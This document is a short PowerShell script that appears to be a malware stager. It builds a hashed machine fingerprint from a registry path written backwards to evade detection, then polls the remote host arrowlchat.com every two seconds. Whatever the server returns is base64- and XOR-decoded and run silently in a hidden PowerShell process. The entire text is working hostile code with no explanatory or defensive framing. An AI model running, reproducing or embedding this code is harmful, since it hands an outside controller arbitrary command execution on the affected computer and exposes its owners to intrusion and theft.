[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty ((([regex]::Matches('yhpargotpyrC\tfosorciM\ERAWTFOS\:MLKH','.','RightToLeft') | ForEach {$_.value}) -join '')) -Name MachineGuid).MachineGUID;
$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($userid)) | ForEach-Object ToString X2) -join '';
while ($true) { 
    try { 
        $r = Invoke-RestMethod -Uri "http://arrowlchat.com/api/v1/$($guid)"
        if ($r -ne '') { 
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
            $p = [Diagnostics.Process]::new();
            $p.StartInfo.WindowStyle = 'Hidden';
            $p.StartInfo.FileName = 'powershell.exe';
            $p.StartInfo.UseShellExecute = $false;
            $p.StartInfo.RedirectStandardInput = $true;
            $p.StartInfo.RedirectStandardOutput = $true;
            $p.Start();
            $p.BeginOutputReadLine();
            foreach ($line in $lines) {
                $p.StandardInput.WriteLine($line);  
            }
            $p.StandardInput.WriteLine('');  
            $p.WaitForExit();
            break;
        } 
    } 
    catch {
    } 
    Start-Sleep 2
}
